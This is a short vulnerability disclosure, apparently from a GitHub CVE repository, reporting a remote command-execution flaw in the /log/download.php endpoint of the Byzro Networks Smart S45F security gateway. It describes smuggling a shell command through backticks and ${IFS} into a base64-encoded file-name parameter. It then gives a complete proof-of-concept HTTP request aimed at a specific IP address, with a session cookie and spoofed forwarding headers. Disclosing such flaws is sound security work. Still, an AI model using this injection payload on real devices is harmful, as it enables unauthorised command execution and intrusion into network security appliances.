Byzro Networks Smart S45F multi-service security gateway intelligent management platform has rce vulnerability

version:S45F

Vulnerability points：/log/download.php

![图片2](https://github.com/7332all/cve/assets/130833400/73b4c372-8f8d-4f31-ae46-e6282783ae4a)


1.Construct the file parameter 1.`sleep${IFS}5`.pcap, then use base64 encryption, construct it on the file parameter, and successfully execute the system command

POC
```
GET /log/download.php?local=1&file=MS5gc2xlZXAke0lGU301YC5wY2Fw&filetype=SMTP HTTP/1.1
Host: 103.121.164.62:8443
Cookie: PHPSESSID=c42fe5569c87343d59c5808ffc63ad31
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Te: trailers
Connection: close
```
![图片1](https://github.com/7332all/cve/assets/130833400/ec2d1548-cc41-4edc-a0a3-7eb8b0972e16)
